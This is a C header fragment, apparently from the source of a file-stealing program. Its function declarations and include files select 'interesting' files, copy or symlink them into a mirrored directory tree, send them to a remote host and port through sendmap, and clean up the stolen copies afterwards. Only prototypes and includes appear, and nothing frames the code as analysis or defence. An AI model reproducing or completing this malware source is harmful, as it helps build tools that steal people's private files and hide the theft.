#if defined FILE_CLEANSE_TIMER
void rmstolens(void);
void cleanstolen(void);
#include "clean.c"
#endif

#ifdef STOLEN_STORAGE
char *readstorepath(void);
char *gethost(void);
unsigned short getport(void);
#include "store.c"
#endif


#define MAXDIR 64   // maximum possible dirnames we can store. this could be evaluated at runtime but idk.
char **getdirstructure(const char *path, int *cdir);
char *createdirstructure(const char *rootdir, const char *path, char **dirs, int cdir);
int mkdirstructure(const char *rootdir, char **dirs, int cdir);
void freedirs(char **dirs, int cdir);
#include "dirs.c"

#define FILENAME_MAXLEN 256

#ifdef BLACKLIST_TOO
int uninteresting(char *path);
#endif

#if defined SYMLINK_FALLBACK || defined SYMLINK_ONLY
int linkfile(const char *oldpath, char *newpath);
#endif

char *fullpath(char *cwd, const char *file);
int fileincwd(char *cwd, const char *file);
#ifdef DIRECTORIES_TOO
int interestingdir(const char *path);
#endif
int interesting(const char *path);
#ifdef ORIGINAL_RW_FALLBACK
void wcfallback(FILE *ofp, off_t fsize, char *newpath);
#endif
#ifdef STOLEN_STORAGE
int sendmap(const char *oldpath, unsigned char *map, off_t fsize);
#endif
int writecopy(const char *old_path, char *new_path);
char *getnewpath(const char *oldpath);
static int takeit(void *oldpath);
void inspectfile(const char *pathname);
#include "steal.c"